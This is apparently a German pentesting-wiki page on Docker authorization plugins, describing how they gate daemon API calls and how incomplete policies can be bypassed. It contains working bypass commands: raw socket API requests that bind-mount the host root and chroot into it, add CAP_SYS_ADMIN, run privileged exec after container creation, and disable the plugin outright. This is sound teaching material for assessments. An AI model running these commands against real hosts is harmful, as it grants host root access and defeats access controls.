# Laufzeit-Autorisierungs-Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Runtime authorization plugins sind eine zusätzliche Richtlinien-Ebene, die entscheidet, ob ein Aufrufer eine bestimmte Aktion des Docker daemon durchführen darf. Docker ist das klassische Beispiel. Standardmäßig hat jeder, der mit dem Docker daemon kommunizieren kann, faktisch weitreichende Kontrolle darüber. Authorization plugins versuchen, dieses Modell einzuschränken, indem sie den authentifizierten Benutzer und die angeforderte API-Operation prüfen und die Anfrage dann gemäß der Richtlinie erlauben oder ablehnen.

Dieses Thema verdient eine eigene Seite, weil es das Exploitationsmodell ändert, wenn ein Angreifer bereits Zugriff auf eine Docker API oder auf einen Benutzer in der `docker` Gruppe hat. In solchen Umgebungen lautet die Frage nicht mehr nur „kann ich den daemon erreichen?“, sondern auch „ist der daemon durch eine Autorisierungsschicht abgesichert, und wenn ja, kann diese Schicht durch unbehandelte Endpunkte, schwache JSON-Parsing-Implementierungen oder Plugin-Management-Berechtigungen umgangen werden?“

## Funktionsweise

Wenn eine Anfrage den Docker daemon erreicht, kann das Autorisierungssubsystem den Anfragekontext an ein oder mehrere installierte Plugins weiterreichen. Das Plugin sieht die authentifizierte Benutzeridentität, die Anfragedetails, ausgewählte Header und Teile des Request- oder Response-Bodys, wenn der Content-Type geeignet ist. Mehrere Plugins können verkettet werden, und der Zugriff wird nur gewährt, wenn alle Plugins die Anfrage erlauben.

Dieses Modell klingt robust, aber seine Sicherheit hängt vollständig davon ab, wie vollständig der Policy-Autor die API verstanden hat. Ein Plugin, das `docker run --privileged` blockiert, aber `docker exec` ignoriert, alternative JSON-Schlüssel wie das top-level `Binds` übersieht oder Plugin-Administration zulässt, kann ein falsches Gefühl von Einschränkung erzeugen und zugleich direkte Privilege-Escalation-Pfade offenlassen.

## Häufige Plugin-Ziele

Wichtige Bereiche für die Richtlinienüberprüfung sind:

- Endpoints zur Container-Erstellung
- `HostConfig`-Felder wie `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` und Optionen zum Teilen von Namespaces
- Verhalten von `docker exec`
- Endpoints für das Plugin-Management
- jeder Endpunkt, der indirekt Laufzeit-Aktionen außerhalb des beabsichtigten Richtlinienmodells auslösen kann

Historisch machten Beispiele wie Twistlock's `authz` plugin und einfache Lehr-Plugins wie `authobot` dieses Modell leicht studierbar, weil deren Policy-Dateien und Codepfade zeigten, wie die Zuordnung von Endpunkt zu Aktion tatsächlich implementiert wurde. Für Assessment-Arbeiten ist die wichtige Lektion, dass der Policy-Autor die gesamte API-Oberfläche verstehen muss und nicht nur die sichtbarsten CLI-Befehle.

## Missbrauch

Das erste Ziel ist herauszufinden, was tatsächlich blockiert wird. Wenn der Daemon eine Aktion ablehnt, leaks die Fehlermeldung oft den Plugin-Namen, was bei der Identifizierung der eingesetzten Kontrolle hilft:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Wenn Sie ein breiteres Endpoint-Profiling benötigen, sind Tools wie `docker_auth_profiler` nützlich, weil sie die ansonsten repetitive Aufgabe automatisieren, zu prüfen, welche API-Routen und JSON-Strukturen vom plugin tatsächlich zugelassen werden.

Wenn die Umgebung ein custom plugin verwendet und Sie mit der API interagieren können, ermitteln Sie, welche Objektfelder tatsächlich gefiltert werden:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Diese Prüfungen sind wichtig, weil viele Autorisierungsfehler feldspezifisch statt konzeptbezogen sind. Ein Plugin kann ein CLI-Muster ablehnen, ohne die äquivalente API-Struktur vollständig zu blockieren.

### Vollständiges Beispiel: `docker exec` fügt nach der Containererstellung Rechte hinzu

Eine Richtlinie, die das Erstellen privilegierter Container blockiert, aber die Erstellung unbeschränkter Container sowie `docker exec` erlaubt, kann dennoch umgangen werden:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Wenn der Daemon den zweiten Schritt akzeptiert, hat der Benutzer einen privilegierten interaktiven Prozess innerhalb eines Containers wiedererlangt, den der Policy-Autor für eingeschränkt hielt.

### Vollständiges Beispiel: Bind Mount Through Raw API

Einige fehlerhafte Policies prüfen nur eine JSON-Struktur. Wenn das bind mount des Root-Dateisystems nicht konsequent blockiert wird, kann der Host trotzdem gemountet werden:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dasselbe Prinzip kann auch unter `HostConfig` auftreten:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die Auswirkung ist eine vollständige Umgehung des Host-Dateisystems. Das interessante Detail ist, dass der Bypass aus unvollständiger Richtlinienabdeckung und nicht aus einem Kernel-Bug resultiert.

### Vollständiges Beispiel: Ungeprüftes Capability-Attribut

Wenn die Richtlinie es versäumt, ein capability-bezogenes Attribut zu filtern, kann der Angreifer einen Container erstellen, der eine gefährliche Capability wiedererlangt:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sobald `CAP_SYS_ADMIN` oder eine ähnlich starke capability vorhanden ist, werden viele breakout techniques, die in [capabilities.md](protections/capabilities.md) und [privileged-containers.md](privileged-containers.md) beschrieben sind, erreichbar.

### Vollständiges Beispiel: Deaktivieren des Plugins

Wenn plugin-management operations erlaubt sind, besteht der sauberste bypass möglicherweise darin, die Kontrolle vollständig auszuschalten:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dies ist ein Richtlinienfehler auf Control-Plane-Ebene. Die Autorisierungsschicht existiert, aber der Benutzer, den sie einschränken sollte, behält weiterhin die Berechtigung, sie zu deaktivieren.

## Prüfungen

Diese Befehle dienen dazu festzustellen, ob eine Richtlinienebene existiert und ob sie vollständig oder nur oberflächlich zu sein scheint.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Was hier interessant ist:

- Verweigerungsnachrichten, die einen plugin-Namen enthalten, bestätigen eine Autorisierungsschicht und offenbaren häufig die genaue Implementierung.
- Eine für den Angreifer sichtbare plugin-Liste kann bereits ausreichen, um zu erkennen, ob disable- oder reconfigure-Operationen möglich sind.
- Eine Policy, die nur offensichtliche CLI-Aktionen blockiert, aber nicht rohe API-Requests, sollte als umgehbar betrachtet werden, bis das Gegenteil bewiesen ist.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | Daemon-Zugriff ist de facto alles-oder-nichts, sofern kein authorization plugin konfiguriert ist | unvollständige plugin-Policy, blacklists statt allowlists, Zulassen von plugin-Management, feldbezogene Blindstellen |
| Podman | Not a common direct equivalent | Podman verlässt sich typischerweise stärker auf Unix-Berechtigungen, rootless execution und Entscheidungen zur API-Exposition als auf Docker-style authz plugins | breite Exposition einer rootful Podman API, schwache socket-Berechtigungen |
| containerd / CRI-O | Different control model | Diese runtimes verlassen sich normalerweise auf socket-Berechtigungen, node-Trust-Grenzen und Kontrollen des höheren Orchestrators anstelle von Docker authz plugins | Mounten des socket in Workloads, schwache node-lokale Vertrauensannahmen |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC und admission controls sind die hauptsächliche Policy-Ebene | zu weit gefasste RBAC, schwache admission-Policy, direkte Exposition von kubelet- oder runtime-APIs |
{{#include ../../../banners/hacktricks-training.md}}
